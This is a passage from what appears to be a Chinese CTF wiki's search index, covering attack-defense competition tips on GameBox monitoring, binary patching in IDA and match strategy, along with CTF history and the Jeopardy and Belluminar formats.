\u5931\u8bef\u5bfc\u81f4\u4e0d\u53ef\u7528\uff0c\u9700\u8981\u53ca\u65f6\u633d\u6551\u3002\u4f46\u662f\u4e5f\u4e0d\u8981\u8fc7\u5ea6\u62c5\u5fc3\u628a\u539f\u6765\u7684\u672a\u4fee\u8865\u8fc7\u7684\u6f0f\u6d1e\u7a0b\u5e8f\u6362\u56de\u53bb\u3002\u56e0\u4e3a down \u6389\u662f\u6240\u6709\u961f\u5e73\u5206\u5f97\u5f88\u5c11\u7684\u5206\uff0c\u800c\u76f4\u63a5\u4e0a\u6f0f\u6d1e\u7a0b\u5e8f\u4f1a\u4f7f\u7684\u5f3a\u52bf\u7684\u961f\u4f0d\u76f4\u63a5\u5229\u7528\u5f97\u5230\u5f88\u9ad8\u7684\u5f97\u5206\u3002\u6240\u4ee5\u8981\u4f9d\u636e\u5177\u4f53\u60c5\u51b5\u5bf9\u5f85\u3002 \u5bf9\u624b\u4e0d\u6b63\u5f53\u653b\u51fb\u5bfc\u81f4 GameBox \u4e0d\u53ef\u7528\u3002\u5982\u679c\u53d1\u73b0\uff0c\u9700\u8981\u53ca\u65f6\u8865\u6551\u3002 \u4e3b\u529e\u65b9\u52a0\u5f3a\u7a0b\u5e8f check\u3002\u8fd9\u79cd\u60c5\u51b5\u4e3b\u529e\u65b9\u4f1a\u5bf9\u6240\u6709\u961f\u5458\u8fdb\u884c\u901a\u77e5\u516c\u544a\u3002\u5728 GameBox \u72b6\u6001\u5899\u4e0a\u7684\u72b6\u6001\u4f1a\u663e\u793a\u8be5\u9898\u7684\u5404\u961f GameBox \u5927\u9762\u79ef\u4e0d\u53ef\u7528\u3002 \u5bf9\u4e8e\u654c\u65b9 GameBox\u3002\u6211\u4eec\u53ef\u4ee5\u83b7\u53d6\u4ee5\u4e0b\u4fe1\u606f\u3002 \u6839\u636e\u653b\u51fb\u6d41\u89c2\u6d4b\u54ea\u4e9b\u961f\u4f0d\u7684 GameBox \u6ca1\u6709\u9632\u5fa1\u6210\u529f\u3002\u9488\u5bf9\u8fd9\u4e9b\u961f\u4f0d\u53ef\u4ee5\u66f4\u591a\u5730\u5b9e\u73b0\u653b\u51fb \u6709\u961f\u4f0d\u62ff\u51fa\u4e00\u8840\u65f6\u3002\u53ef\u4ee5\u6839\u636e\u5404\u961f GameBox \u72b6\u6001\u63a8\u65ad\u51fa\u4e00\u8840\u961f\u4f0d\u662f\u5426\u5df2\u7ecf\u5199\u51fa\u5229\u7528\u811a\u672c\u3002\u5199\u51fa\u5229\u7528\u811a\u672c\u540e\u53ef\u4ee5\u89c2\u6d4b\u5df1\u65b9\u662f\u5426\u505a\u597d\u4e86\u9632\u5fa1\u3002","title":"\u5173\u6ce8 Gamebox \u72b6\u6001"},{"location":"introduction/experience/#_1","text":"\u6bd4\u8d5b\u8fc7\u7a0b\u4e2d\u4f1a\u4e3b\u529e\u65b9\u4f1a\u5b89\u6392\u597d\u5408\u7406\u7684\u7f51\u6bb5\u5206\u5e03\u3002 \u7ef4\u62a4\u7684\u65f6\u5019\u9700\u8981\u8fde\u63a5\u5230\u672c\u961f GameBox \u6240\u5728\u7f51\u6bb5\u4e0a\uff0c\u6839\u636e\u4e3b\u529e\u65b9\u63d0\u4f9b\u7684 CTF \u8d26\u53f7\u4e0e\u5bc6\u7801\u767b\u5f55\u3002\u800c\u4e0e\u5176\u4ed6\u961f\u4f0d\u7684 GameBox \u4ea4\u4e92\u65f6\u5219\u9700\u8981\u8fde\u63a5\u5230\u5bf9\u5e94\u7684\u7f51\u6bb5\u91cc\u4e0e\u6f0f\u6d1e\u7a0b\u5e8f\u8fdb\u884c\u4ea4\u4e92\u3002\u63d0\u4ea4 flag \u5219\u9700\u8981\u5230\u6307\u5b9a\u7684\u7b54\u9898\u5e73\u53f0\u4e0a\u63d0\u4ea4\u3002 Warning \u8fd9\u91cc\u5c24\u5176\u9700\u8981\u6ce8\u610f\u7684\u5c31\u662f\u7aef\u53e3\u3002\u5982\u679c\u7aef\u53e3\u5728\u4e0d\u8f7b\u6613\u95f4\u5f04\u9519\u7684\u8bdd\uff0c\u8fd9\u6837\u7684\u9519\u8bef\u662f\u633a\u96be\u5bdf\u89c9\u5230\u7684\uff0c\u800c\u8fd9\u6837\u7684\u5931\u8bef\u4e5f\u4f1a\u5e26\u6765\u4e0d\u5fc5\u8981\u7684\u635f\u5931\u3002\u751a\u81f3\u4f1a\u51fa\u73b0\u957f\u65f6\u95f4\u65e0\u6cd5\u63d0\u4ea4 flag \u7684\u81f4\u547d\u60c5\u51b5\u3002\u6240\u4ee5\u9700\u8981\u5c0f\u5fc3\u6ce8\u610f\u3002","title":"\u5206\u6e05\u533a\u6bb5\u4e0e\u7aef\u53e3"},{"location":"introduction/experience/#patch","text":"\u7a0b\u5e8f patch \u8981\u5408\u7406\uff0c\u7b26\u5408\u88c1\u5224\u7cfb\u7edf check \u6761\u4ef6\u3002\u867d\u7136\u7cfb\u7edf\u7684 check \u662f check \u54ea\u91cc\u5e76\u672a\u516c\u5f00\uff0c\u4f46\u662f\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u7cfb\u7edf\u662f\u4e0d\u4f1a\u8fc7\u5ea6\u4e3a\u96be\u7684\u3002 \u7a0b\u5e8f patch \u4f7f\u7528 IDA \u8fdb\u884c\u4fee\u6539\uff0cIDA \u63d0\u4f9b\u4e86\u4e09\u79cd\u65b9\u5f0f\u7684 patch\uff1abyte\uff0cword\uff0cassemble.\u5176\u4e2d\u5b57\u8282\u7801\u4fee\u6539\u6bd4\u8f83\u597d\u7528\u3002\u56e0\u4e3a\u9010\u5b57\u8282\u4fee\u6539\u4e0d\u9700\u8003\u8651\u6c47\u7f16\u6307\u4ee4\uff0c\u4e00\u822c\u8fd9\u6837\u7684\u4fee\u6539\u6539\u52a8\u4e5f\u5f88\u5c0f\uff0c\u5728\u4e00\u5b9a\u573a\u5408\u4e0b\u5341\u5206\u597d\u7528\u3002\u6c47\u7f16\u6307\u4ee4\u7ea7\u522b\u7684\u4fee\u6539\u867d\u7136\u65b9\u4fbf\u4e0d\u9700\u8981\u4fee\u6539\u5b57\u8282\u7801\uff0c\u4f46\u662f\u4e5f\u9020\u6210\u4e86\u4e00\u5b9a\u7684\u4e0d\u4fbf\u3002\u6bd4\u5982\u9700\u8981\u989d\u5916\u8003\u8651\u6c47\u7f16\u6307\u4ee4\u7684\u957f\u5ea6\uff0c\u7ed3\u6784\u662f\u5426\u5408\u7406\u5b8c\u6574\uff0c\u903b\u8f91\u662f\u5426\u548c\u539f\u6765\u4e00\u6837\uff0c\u4fee\u6539\u7684\u6c47\u7f16\u6307\u4ee4\u662f\u5426\u5408\u6cd5\u7b49\u95ee\u9898\u3002 \u5728 patch \u7a0b\u5e8f\u65f6\u8981\u8bb0\u5f97\u5907\u4efd\u539f\u6765\u7684\u6f0f\u6d1e\u7a0b\u5e8f\uff0c\u4ee5\u4f9b\u961f\u4f0d\u5206\u6790\u4f7f\u7528\u3002\u5728\u4e0a\u4f20 patch \u7684\u65f6\u5019\u5e94\u8be5\u5148\u5220\u9664\u539f\u6765\u7684\u6f0f\u6d1e\u7a0b\u5e8f\uff0c\u7136\u540e\u5c06 patch \u8fc7\u7684\u7a0b\u5e8f\u590d\u5236\u8fdb\u53bb\uff0c\u590d\u5236\u8fdb\u53bb\u4e4b\u540e\u8fd8\u9700\u8981\u7ed9\u7a0b\u5e8f\u8d4b\u4e88\u76f8\u5e94\u7684\u6743\u9650\u3002 \u4e00\u822c\u6bd4\u8d5b\u4e2d\uff0c\u6f0f\u6d1e\u7a0b\u5e8f\u4f1a\u6709\u5341\u51e0\u5904\u9700\u8981 patch \u7684\u5730\u65b9\u3002Patch \u7684\u65f6\u5019\u4e0d\u4ec5\u8981\u8bb2\u7a76\u6709\u6548\u5408\u7406\uff0c\u8fd8\u8981\u6ee1\u8db3\u80fd\u591f\u5728\u4e00\u5b9a\u7a0b\u5ea6\u4e0a\u9632\u8303\u6216\u6df7\u6dc6\u5bf9\u624b\u7684\u5206\u6790\u3002","title":"\u670d\u52a1 patch \u4e0e\u9632\u5fa1"},{"location":"introduction/experience/#_2","text":"\u5728\u653b\u9632\u6bd4\u8d5b\u8fc7\u7a0b\u4e2d\uff0c\u4e00\u8840\u663e\u5f97\u5c24\u5176\u91cd\u8981\u3002\u56e0\u6b64\u6709\u4e00\u4e2a\u653b\u51fb\u811a\u672c\u6846\u67b6\u662f\u975e\u5e38\u6709\u5229\u7684\u3002\u5feb\u901f\u5f00\u53d1\u653b\u51fb\u811a\u672c\uff0c\u53ef\u4ee5\u5728\u524d\u671f\u4fdd\u6301\u4f18\u52bf\u5730\u4f4d\uff0c\u4e5f\u53ef\u4ee5\u5728\u4e0d\u65ad\u62ff\u5206\u7684\u540c\u65f6\u7701\u4e0b\u65f6\u95f4\u53bb\u505a\u597d\u9632\u5fa1\u3002","title":"\u6784\u9020\u811a\u672c\u6846\u67b6\u5feb\u901f\u5c55\u5f00\u653b\u51fb"},{"location":"introduction/experience/#_3","text":"\u5728\u6bd4\u8d5b\u8fc7\u7a0b\u4e2d\uff0c\u4e0d\u5b9c\u6b7b\u8017\u5728\u4e00\u9053\u9898\u4e0a\uff0c\u7531\u4e8e\u4e00\u8840\u7684\u4f18\u52bf\u6027\uff0c\u5728\u6bd4\u8d5b\u8fc7\u7a0b\u4e2d\u66f4\u5e94\u8be5\u5168\u9762\u4e86\u89e3\u8d5b\u9898\u96be\u5ea6\uff0c\u5148\u4ece \u7b80\u5355\u9898 \u5f00\u59cb\u8fdb\u884c\u5206\u6790\uff0c\u6b65\u6b65\u4e3a\u8425\u3002 \u6bd4\u8d5b\u8fc7\u7a0b\u4e2d\uff0c\u4e24\u6781\u4f1a\u4e25\u91cd\u5206\u5316\u3002\u5e94\u8be5\u7740\u529b\u6253\u51fb\u548c\u81ea\u5df1\u5b9e\u529b\u76f8\u5f53\u548c\u6bd4\u81ea\u5df1\u961f\u4f0d\u66f4\u5f3a\u7684\u961f\u4f0d\uff0c\u5c24\u5176\u662f\u5206\u6570\u76f8\u5dee\u65e0\u51e0\u7684\u60c5\u51b5\u4e0b\uff0c\u66f4\u8981\u4e25\u9632\u4e25\u5b88\u3002 \u6bd4\u8d5b\u4e2d NPC \u4f1a\u4e0d\u5b9a\u65f6\u53d1\u51fa\u653b\u51fb\u6d41\u91cf\u3002\u4ece\u653b\u51fb\u6d41\u91cf\u4e2d\u53ef\u4ee5\u5f97\u5230 payload\u3002 \u4e00\u5b9a\u8981\u628a NPC \u5f80\u6b7b\u91cc\u6253\u3002 \u5728\u5f00\u8d5b\u521d\u53ef\u4ee5\u5c06\u6240\u6709\u7684\u7ba1\u7406\u5bc6\u7801\u90fd\u8bbe\u7f6e\u4e3a\u540c\u4e00\u4e2a\u5bc6\u7801\uff0c\u8fd9\u6837\u65b9\u4fbf\u961f\u5458\u767b\u5f55\u7ba1\u7406\u3002\u5728\u521d\u671f\u5c06\u6240\u6709\u6587\u4ef6\u5907\u4efd\u4e0b\u6765\u4f9b\u961f\u5185\u5206\u4eab\u3002","title":"\u6bd4\u8d5b\u7684\u4e00\u4e9b\u7b56\u7565"},{"location":"introduction/history/","text":"\u672c\u680f\u5185\u5bb9\u6458\u81ea\u8bf8\u845b\u5efa\u4f1f\u8001\u5e08\u5728 i \u6625\u79cb\u4e0a\u7684\u516c\u5f00\u89c6\u9891\u300cCTF \u7684\u8fc7\u53bb\u3001\u73b0\u5728\u4e0e\u672a\u6765\u300d\u3002 CTF \u7684\u8d77\u6e90 \u00b6 CTF \u7684\u524d\u8eab\u662f\u4f20\u7edf\u9ed1\u5ba2\u4e4b\u95f4\u7f51\u7edc\u6280\u672f\u6bd4\u62fc\u7684\u6e38\u620f\uff0c\u8d77\u6e90\u4e8e 1996 \u5e74\u7b2c\u56db\u5c4a DEFCON\u3002 \u65e9\u671f CTF \u7ade\u8d5b \u00b6 \u6700\u5f00\u59cb\u7684 CTF \u6bd4\u8d5b\uff081996 \u5e74-2001 \u5e74\uff09\uff0c\u6ca1\u6709\u660e\u786e\u7684\u6bd4\u8d5b\u89c4\u5219\uff0c\u6ca1\u6709\u4e13\u4e1a\u642d\u5efa\u7684\u6bd4\u8d5b\u5e73\u53f0\u4e0e\u73af\u5883\u3002\u7531\u53c2\u6570\u961f\u4f0d\u5404\u81ea\u51c6\u5907\u6bd4\u8d5b\u76ee\u6807\uff08\u81ea\u5df1\u51c6\u5907\u7684\u6bd4\u8d5b\u76ee\u6807\u81ea\u5df1\u9632\u5b88\u5e76\u8981\u5c1d\u8bd5\u653b\u7834\u5bf9\u65b9\u63d0\u4f9b\u7684\u6bd4\u8d5b\u76ee\u6807\uff09\u3002\u800c\u7ec4\u7ec7\u8005\u5927\u90fd\u53ea\u662f\u4e00\u4e9b\u975e\u4e13\u4e1a\u7684\u5fd7\u613f\u8005\uff0c\u63a5\u53d7\u53c2\u8d5b\u961f\u4f0d\u8bf7\u6c42\u624b\u5de5\u8ba1\u5206\u3002 \u6ca1\u6709\u540e\u53f0\u81ea\u52a8\u7cfb\u7edf\u652f\u6301\u548c\u88c1\u5224\u6280\u672f\u80fd\u529b\u8ba4\u5b9a\uff0c\u8ba1\u5206\u5ef6\u8fdf\u548c\u8bef\u5dee\u4ee5\u53ca\u4e0d\u53ef\u9760\u7684\u7f51\u7edc\u548c\u4e0d\u5f53\u7684\u914d\u7f6e\uff0c\u5bfc\u81f4\u6bd4\u8d5b\u5e26\u6765\u4e86\u6781\u5927\u7684\u4e89\u8bba\u4e0e\u4e0d\u6ee1\u3002 \u300c\u73b0\u4ee3\u300dCTF \u7ade\u8d5b \u00b6 \u7531\u4e13\u4e1a\u961f\u4f0d\u627f\u62c5\u6bd4\u8d5b\u5e73\u53f0\u3001\u547d\u9898\u3001\u8d5b\u4e8b\u7ec4\u7ec7\u4ee5\u53ca\u81ea\u52a8\u5316\u79ef\u5206\u7cfb\u7edf\u3002\u53c2\u8d5b\u961f\u4f0d\u9700\u63d0\u4ea4\u53c2\u8d5b\u7533\u8bf7\uff0c\u7531 DEFCON \u4f1a\u8bae\u7ec4\u7ec7\u8005\u4eec\u8fdb\u884c\u8bc4\u9009\u3002 \u5c31 LegitBS \u7ec4\u7ec7\u7684\u4e09\u5e74 DEFCON CTF \u6bd4\u8d5b\u800c\u8a00\uff0c\u6709\u4ee5\u4e0b\u7a81\u51fa\u7279\u70b9\uff1a \u6bd4\u8d5b\u4fa7\u91cd\u4e8e\u5bf9\u8ba1\u7b97\u673a\u5e95\u5c42\u548c\u7cfb\u7edf\u5b89\u5168\u6838\u5fc3\u80fd\u529b\uff0cWeb \u6f0f\u6d1e\u653b\u9632\u6280\u5de7\u5b8c\u5168\u4e0d\u53d7\u91cd\u89c6\u3002 \u7ade\u8d5b\u73af\u5883\u8d8b\u5411\u591a CPU \u6307\u4ee4\u67b6\u6784\u96c6\uff0c\u591a\u64cd\u4f5c\u7cfb\u7edf\uff0c\u591a\u7f16\u7a0b\u8bed\u8a00\u3002 \u91c7\u7528\u300c\u96f6\u548c\u300d\u8ba1\u5206\u89c4\u5219\u3002 \u56e2\u961f\u7efc\u5408\u80fd\u529b\u8003\u7814\uff1a\u9006\u5411\u5206\u6790\u3001\u6f0f\u6d1e\u6316\u6398\u3001\u6f0f\u6d1e\u5229\u7528\u3001\u6f0f\u6d1e\u4fee\u8865\u52a0\u56fa\u3001\u7f51\u7edc\u6d41\u91cf\u5206\u6790\u3001\u7cfb\u7edf\u5b89\u5168\u8fd0\u7ef4\u4ee5\u53ca\u9762\u5411\u5b89\u5168\u7684\u7f16\u7a0b\u8c03\u8bd5\u3002","title":"CTF \u5386\u53f2"},{"location":"introduction/history/#ctf","text":"CTF \u7684\u524d\u8eab\u662f\u4f20\u7edf\u9ed1\u5ba2\u4e4b\u95f4\u7f51\u7edc\u6280\u672f\u6bd4\u62fc\u7684\u6e38\u620f\uff0c\u8d77\u6e90\u4e8e 1996 \u5e74\u7b2c\u56db\u5c4a DEFCON\u3002","title":"CTF \u7684\u8d77\u6e90"},{"location":"introduction/history/#ctf_1","text":"\u6700\u5f00\u59cb\u7684 CTF \u6bd4\u8d5b\uff081996 \u5e74-2001 \u5e74\uff09\uff0c\u6ca1\u6709\u660e\u786e\u7684\u6bd4\u8d5b\u89c4\u5219\uff0c\u6ca1\u6709\u4e13\u4e1a\u642d\u5efa\u7684\u6bd4\u8d5b\u5e73\u53f0\u4e0e\u73af\u5883\u3002\u7531\u53c2\u6570\u961f\u4f0d\u5404\u81ea\u51c6\u5907\u6bd4\u8d5b\u76ee\u6807\uff08\u81ea\u5df1\u51c6\u5907\u7684\u6bd4\u8d5b\u76ee\u6807\u81ea\u5df1\u9632\u5b88\u5e76\u8981\u5c1d\u8bd5\u653b\u7834\u5bf9\u65b9\u63d0\u4f9b\u7684\u6bd4\u8d5b\u76ee\u6807\uff09\u3002\u800c\u7ec4\u7ec7\u8005\u5927\u90fd\u53ea\u662f\u4e00\u4e9b\u975e\u4e13\u4e1a\u7684\u5fd7\u613f\u8005\uff0c\u63a5\u53d7\u53c2\u8d5b\u961f\u4f0d\u8bf7\u6c42\u624b\u5de5\u8ba1\u5206\u3002 \u6ca1\u6709\u540e\u53f0\u81ea\u52a8\u7cfb\u7edf\u652f\u6301\u548c\u88c1\u5224\u6280\u672f\u80fd\u529b\u8ba4\u5b9a\uff0c\u8ba1\u5206\u5ef6\u8fdf\u548c\u8bef\u5dee\u4ee5\u53ca\u4e0d\u53ef\u9760\u7684\u7f51\u7edc\u548c\u4e0d\u5f53\u7684\u914d\u7f6e\uff0c\u5bfc\u81f4\u6bd4\u8d5b\u5e26\u6765\u4e86\u6781\u5927\u7684\u4e89\u8bba\u4e0e\u4e0d\u6ee1\u3002","title":"\u65e9\u671f CTF \u7ade\u8d5b"},{"location":"introduction/history/#ctf_2","text":"\u7531\u4e13\u4e1a\u961f\u4f0d\u627f\u62c5\u6bd4\u8d5b\u5e73\u53f0\u3001\u547d\u9898\u3001\u8d5b\u4e8b\u7ec4\u7ec7\u4ee5\u53ca\u81ea\u52a8\u5316\u79ef\u5206\u7cfb\u7edf\u3002\u53c2\u8d5b\u961f\u4f0d\u9700\u63d0\u4ea4\u53c2\u8d5b\u7533\u8bf7\uff0c\u7531 DEFCON \u4f1a\u8bae\u7ec4\u7ec7\u8005\u4eec\u8fdb\u884c\u8bc4\u9009\u3002 \u5c31 LegitBS \u7ec4\u7ec7\u7684\u4e09\u5e74 DEFCON CTF \u6bd4\u8d5b\u800c\u8a00\uff0c\u6709\u4ee5\u4e0b\u7a81\u51fa\u7279\u70b9\uff1a \u6bd4\u8d5b\u4fa7\u91cd\u4e8e\u5bf9\u8ba1\u7b97\u673a\u5e95\u5c42\u548c\u7cfb\u7edf\u5b89\u5168\u6838\u5fc3\u80fd\u529b\uff0cWeb \u6f0f\u6d1e\u653b\u9632\u6280\u5de7\u5b8c\u5168\u4e0d\u53d7\u91cd\u89c6\u3002 \u7ade\u8d5b\u73af\u5883\u8d8b\u5411\u591a CPU \u6307\u4ee4\u67b6\u6784\u96c6\uff0c\u591a\u64cd\u4f5c\u7cfb\u7edf\uff0c\u591a\u7f16\u7a0b\u8bed\u8a00\u3002 \u91c7\u7528\u300c\u96f6\u548c\u300d\u8ba1\u5206\u89c4\u5219\u3002 \u56e2\u961f\u7efc\u5408\u80fd\u529b\u8003\u7814\uff1a\u9006\u5411\u5206\u6790\u3001\u6f0f\u6d1e\u6316\u6398\u3001\u6f0f\u6d1e\u5229\u7528\u3001\u6f0f\u6d1e\u4fee\u8865\u52a0\u56fa\u3001\u7f51\u7edc\u6d41\u91cf\u5206\u6790\u3001\u7cfb\u7edf\u5b89\u5168\u8fd0\u7ef4\u4ee5\u53ca\u9762\u5411\u5b89\u5168\u7684\u7f16\u7a0b\u8c03\u8bd5\u3002","title":"\u300c\u73b0\u4ee3\u300dCTF \u7ade\u8d5b"},{"location":"introduction/mode/","text":"\u89e3\u9898\u6a21\u5f0f - Jeopardy \u00b6 \u89e3\u9898\u6a21\u5f0f\uff08Jeopardy\uff09\u5e38\u89c1\u4e8e\u7ebf\u4e0a\u9009\u62d4\u6bd4\u8d5b\u3002\u5728\u89e3\u9898\u6a21\u5f0f CTF \u8d5b\u5236\u4e2d\uff0c\u53c2\u8d5b\u961f\u4f0d\u53ef\u4ee5\u901a\u8fc7\u4e92\u8054\u7f51\u6216\u8005\u73b0\u573a\u7f51\u7edc\u53c2\u4e0e\uff0c\u53c2\u6570\u961f\u4f0d\u901a\u8fc7\u4e0e\u5728\u7ebf\u73af\u5883\u4ea4\u4e92\u6216\u6587\u4ef6\u79bb\u7ebf\u5206\u6790\uff0c\u89e3\u51b3\u7f51\u7edc\u5b89\u5168\u6280\u672f\u6311\u6218\u83b7\u53d6\u76f8\u5e94\u5206\u503c\uff0c\u4e0e ACM \u7f16\u7a0b\u7ade\u8d5b\u3001\u4fe1\u606f\u5b66\u5965\u8d5b\u6bd4\u8f83\u7c7b\u4f3c\uff0c\u6839\u636e\u603b\u5206\u548c\u65f6\u95f4\u6765\u6392\u540d\u3002 \u76f8\u4e0d\u540c\u7684\u662f\u89e3\u9898\u6a21\u5f0f\u4e00\u822c\u4f1a\u8bbe\u7f6e \u4e00\u8840 \u3001 \u4e8c\u8840 \u3001 \u4e09\u8840 \uff0c\u4e5f\u5373\u6700\u5148\u5b8c\u6210\u7684\u524d\u4e09\u652f\u961f\u4f0d\u4f1a\u83b7\u5f97\u989d\u5916\u5206\u503c\uff0c\u6240\u4ee5\u8fd9\u4e0d\u4ec5\u662f\u5bf9\u9996\u5148\u89e3\u51fa\u9898\u76ee\u7684\u961f\u4f0d\u7684\u5206\u503c\u9f13\u52b1\uff0c\u4e5f\u662f\u4e00\u79cd\u56e2\u961f\u80fd\u529b\u7684\u95f4\u63a5\u4f53\u73b0\u3002 \u5f53\u7136\u8fd8\u6709\u4e00\u79cd\u6d41\u884c\u7684\u8ba1\u5206\u89c4\u5219\u662f\u8bbe\u7f6e\u6bcf\u9053\u9898\u76ee\u7684\u521d\u59cb\u5206\u6570\u540e\uff0c\u6839\u636e\u8be5\u9898\u7684\u6210\u529f\u89e3\u7b54\u961f\u4f0d\u6570\uff0c\u6765\u9010\u6e10\u964d\u4f4e\u8be5\u9898\u7684\u5206\u503c\uff0c\u4e5f\u5c31\u662f\u8bf4\u5982\u679c\u89e3\u7b54\u8fd9\u9053\u9898\u7684\u4eba\u6570\u8d8a\u591a\uff0c\u90a3\u4e48\u8fd9\u9053\u9898\u7684\u5206\u503c\u5c31\u8d8a\u4f4e\u3002\u6700\u540e\u4f1a\u4e0b\u964d\u5230\u4e00\u4e2a\u4fdd\u5e95\u5206\u503c\u540e\u4fbf\u4e0d\u518d\u4e0b\u964d\u3002 \u9898\u76ee\u7c7b\u578b\u4e3b\u8981\u5305\u542b Web \u7f51\u7edc\u653b\u9632 \u3001 RE \u9006\u5411\u5de5\u7a0b \u3001 Pwn \u4e8c\u8fdb\u5236\u6f0f\u6d1e\u5229\u7528 \u3001 Crypto \u5bc6\u7801\u653b\u51fb \u3001 Mobile \u79fb\u52a8\u5b89\u5168 \u4ee5\u53ca Misc \u5b89\u5168\u6742\u9879 \u8fd9\u516d\u4e2a\u7c7b\u522b\u3002 \u6218\u4e89\u5206\u4eab\u6a21\u5f0f - Belluminar \u00b6 \u5728 2016 \u5e74\u4e16\u754c\u9ed1\u5ba2\u5927\u5e08\u6311\u6218\u8d5b\uff08WCTF\uff09\u56fd\u5185\u9996\u6b21\u5f15\u5165\u97e9\u56fd POC SECURITY \u56e2\u961f\u5f00\u521b\u7684 BELLUMINAR CTF \uff08\u6218\u4e89\u4e0e\u5206\u4eab\uff09\u8d5b\u5236\uff0c\u4ece\u6b64\u56fd\u5185\u9646\u9646\u7eed\u7eed\u4e5f\u6709\u5f00\u59cb BELLUMINAR \u6a21\u5f0f\u7684\u6bd4\u8d5b\uff0c\u76ee\u524d\u91c7\u53d6\u8fd9\u4e00\u8d5b\u5236\u7684\u6709 2016 \u5e74\u8bf8\u845b\u5efa\u4f1f\u8001\u5e08\u96c6\u5408\u7684 XMan \u590f\u4ee4\u8425\u5206\u4eab\u8d5b\u4ee5\u53ca\u540c\u5e74 9 \u6708\u7684\u300c\u767e\u5ea6\u676f\u300dCTF \u6bd4\u8d5b\u3002 \u540c\u65f6\u8fd9\u91cc\u4e5f\u6709 BELLUMINAR \u8d5b\u5236\u7684\u4ecb\u7ecd\u5b98\u7f51\uff1a http://belluminar.org/ \u8d5b\u5236\u4ecb\u7ecd \u00b6 Belluminar, hacking contest of POC, started at POC2015 in KOREA for the first time. Belluminar is from 'Bellum'(war in Latin) and 'seminar'. It is not a just hacking contest but a kind of festival consisted of CTF & seminar for the solution about challenges. Only invited teams can join Belluminar. Each team can show its ability to attack what other teams want to protect and can defend what others want to attack. \u5982\u5b98\u7f51\u4ecb\u7ecd\u8fd9\u6837\uff0cBELLUMINAR CTF \u8d5b\u5236\u7531\u53d7\u9080\u53c2\u8d5b\u961f\u4f0d\u76f8\u4e92\u51fa\u9898\u6311\u6218\uff0c\u5e76\u5728\u6bd4\u8d5b\u7ed3\u675f\u540e\u8fdb\u884c\u8d5b\u9898\u7684\u51fa\u9898\u601d\u8def\uff0c\u5b66\u4e60\u8fc7\u7a0b\u4ee5\u53ca\u89e3\u9898\u601d\u8def\u7b49\u8fdb\u884c\u5206\u4eab\u3002\u6218\u961f\u8bc4\u5206\u4f9d\u636e\u51fa\u9898\u5f97\u5206\uff0c\u89e3\u9898\u5f97\u5206\u548c\u5206\u4eab\u5f97\u5206\u8fdb\u884c\u7efc\u5408\u8bc4\u4ef7\u5e76\u5f97\u51fa\u6700\u7ec8\u7684\u6392\u540d\u3002 \u51fa\u9898\u9636\u6bb5 \u00b6 Each team is required to submit 2 challenges to the challenge bank of the sponsor. \u9996\u5148\u5404\u4e2a\u53d7\u9080\u53c2\u8d5b\u961f\u4f0d\u90fd\u5fc5\u987b\u5728\u6b63\u5f0f\u6bd4\u8d5b\u524d\u51fa\u9898\uff0c\u9898\u91cf\u4e3a 2 \u9053\u3002\u53c2\u8d5b\u961f\u4f0d\u5c06\u6709 12 \u5468\u7684\u65f6\u95f4\u51c6\u5907\u9898\u76ee\u3002\u51fa\u9898\u79ef\u5206\u5360\u603b\u5206\u7684 30%\u3002 Challenge 1: must be on the Linux platform; Challenge 2: No platform restriction(except Linux) No challenge type restriction (Pwn, Reverse...) \u4f20\u7edf\u7684 BELLUMINAR \u8d5b\u5236\u8981\u6c42\u51fa\u7684\u4e24\u9053\u9898\u4e2d\u4e00\u9053 Challenge \u5fc5\u987b\u662f\u5728 Linux \u5e73\u53f0\uff0c\u53e6\u5916\u4e00\u4e2a\u5219\u4e3a\u975e Linux \u5e73\u53f0\u7684 Challenge\u3002\u4e24\u4e2a Challenge \u7684\u7c7b\u578b\u5219\u6ca1\u6709\u505a\u51fa\u9650\u5236\u3002\u56e0\u6b64\u961f\u4f0d\u53ef\u4ee5\u5c3d\u60c5\u5c55\u73b0\u81ea\u5df1\u7684\u6280\u672f\u6c34\u5e73\u3002 \u4e3a\u4f7f\u6bd4\u8d5b\u9898\u76ee\u7c7b\u578b\u6bd4\u8f83\u5747\u8861\uff0c\u4e5f\u6709\u91c7\u7528\u961f\u4f0d\u62bd\u7b7e\u51fa\u9898\u7684\u65b9\u5f0f\u62bd\u53d6\u81ea\u5df1\u7684\u9898\uff0c\u8fd9\u8981\u6c42\u961f\u4f0d\u80fd\u529b\u6c34\u5e73\u66f4\u4e3a\u5168\u9762\uff0c\u56e0\u6b64\u4e3a\u4e86\u4e0d\u5931\u5e73\u8861\u6027\uff0c\u4e5f\u4f1a\u5c06\u4e24\u9053 Challenge \u7684\u8ba1\u5165\u4e0d\u540c\u5206\u503c\uff08\u6bd4\u5982\u8981\u6c42\u5176\u4e2d\u4e00\u9053 Challenge \u5206\u503c\u4e3a 200\uff0c\u800c\u53e6\u5916\u4e00\u9053\u5206\u503c\u5219\u4e3a 100\uff09\u3002 \u63d0\u4ea4\u90e8\u7f72 \u00b6 \u9898\u76ee\u63d0\u4ea4\u622a\u6b62\u4e4b\u524d\uff0c\u5404\u4e2a\u961f\u4f0d\u9700\u8981\u63d0\u4ea4\u5b8c\u6574\u7684\u51fa\u9898\u6587\u6863\u4ee5\u53ca\u89e3\u9898 Writeup\uff0c\u8981\u6c42\u51fa\u9898\u6587\u6863\u4e2d\u8be6\u7ec6\u6807\u660e\u9898\u76ee\u5206\u503c\uff0c\u9898\u9762\uff0c\u51fa\u9898\u8d1f\u8d23\u4eba\uff0c\u8003\u5bdf\u77e5\u8bc6\u70b9\u5217\u8868\u4ee5\u53ca\u9898\u76ee\u6e90\u7801\u3002\u800c\u89e3\u9898 Writeup \u4e2d\u5219\u9700\u8981\u5305\u542b\u64cd\u4f5c\u73af\u5883\uff0c\u5b8c\u6574\u89e3\u9898\u8fc7\u7a0b\uff0c\u89e3\u9898\u4ee3\u7801\u3002 \u9898\u76ee\u63d0\u4ea4\u4e4b\u540e\u4e3b\u529e\u65b9\u4f1a\u5bf9\u9898\u76ee\u548c\u89e3\u9898\u4ee3\u7801\u8fdb\u884c\u6d4b\u8bd5\uff0c\u671f\u95f4\u51fa\u73b0\u95ee\u9898\u5219\u9700\u8981\u8be5\u9898\u8d1f\u8d23\u4eba\u914d\u5408\u89e3\u51b3\u3002\u6700\u7ec8\u90e8\u7f72\u5230\u6bd4\u8d5b\u5e73\u53f0\u4e0a\u3002 \u89e3\u9898\u7ade\u6280 \u00b6 